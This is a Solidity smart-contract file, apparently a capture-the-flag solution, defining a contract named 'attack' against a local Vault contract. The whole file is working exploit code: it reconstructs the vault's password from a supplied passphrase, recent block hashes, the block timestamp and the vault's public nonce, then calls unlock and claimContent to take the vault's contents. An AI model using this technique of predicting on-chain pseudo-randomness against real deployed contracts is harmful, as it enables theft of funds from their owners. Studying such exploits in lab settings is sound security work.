// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./vault.sol";


contract attack{
    Vault public vault;

    bytes32 public passphrase;
    uint256 nonce;
     
     constructor(address _vault, bytes32 _passphrase){
        vault = Vault(_vault);
        passphrase = _passphrase;
     }

     function _magicPassword() private returns (bytes8){
        uint256 _key1 = uint256(_generateKey((block.timestamp %2) +1));
        uint128 _key2 = uint128(_generateKey(2));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
     }

     function _generateKey(uint _reductor) private  returns(uint256 ret){
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
        nonce++;
    }

    function unlock() public {
        nonce = vault.nonce();
        uint128 _key = uint128(bytes16(_magicPassword()) >>64);
        uint128 _owner = uint128(uint64(uint160(vault.owner())));
        vault.unlock(bytes16((_owner << 64) | _key));
        vault.claimContent(); 

    }


}